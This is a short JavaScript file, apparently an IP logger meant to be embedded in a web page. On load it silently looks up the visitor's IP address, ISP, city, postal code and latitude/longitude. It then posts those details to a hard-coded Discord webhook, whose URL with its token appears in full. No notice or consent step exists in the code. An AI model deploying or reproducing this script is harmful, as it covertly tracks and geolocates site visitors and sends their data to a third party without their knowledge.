
const webHookUrl = "https://discord.com/api/webhooks/1259114940854304769/40loCtX1nLtcWEV-9HwnojQkQ3tDra1BA3Y_tadLYbr3mfEvUvWw1YrfYIhmG0YG3ZcV";

const fetchData = async () => {
    try {

        if (!webHookUrl) {
            console.error('Webhook URL is empty or not found.');
            return;
        }

        // Fetching IP data
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        // Retrieve previous IP from temp storage
        const prevIp = localStorage.getItem('prevIp');

        // If previous IP is the same as the current one, do not send to Discord
        if (prevIp && prevIp === data.ip) {
            return;
        }

        // // Update temp storage with the current IP
        localStorage.setItem('prevIp', data.ip);

        const ip = data.ip;
        const provider = data.org + " (" + data.asn + ")";
        const timezone = data.timezone;
        const country = data.country_name;
        const region = data.region;
        const city = data.city;
        const zip = data.postal;
        const lat = data.latitude;
        const lon = data.longitude;


        // Discord Message Structure
        const params = {
            content:
                "```IP-Address: " + ip +
                "\n \nTimezone: " + timezone +
                "\nProvider: " + provider +
                "\n \nCountry and Region: " + country + " - " + region +
                "\nCity: " + city +
                "\nZip Code: " + zip +
                "\n \nLongitude: " + lon + 
                "\nLatitude: " + lat + " @role```"
        };


        await fetch(webHookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params),
        });

        console.log(params);
        


    } catch (error) {
        console.error('Script running error', error);
    }
};

fetchData();
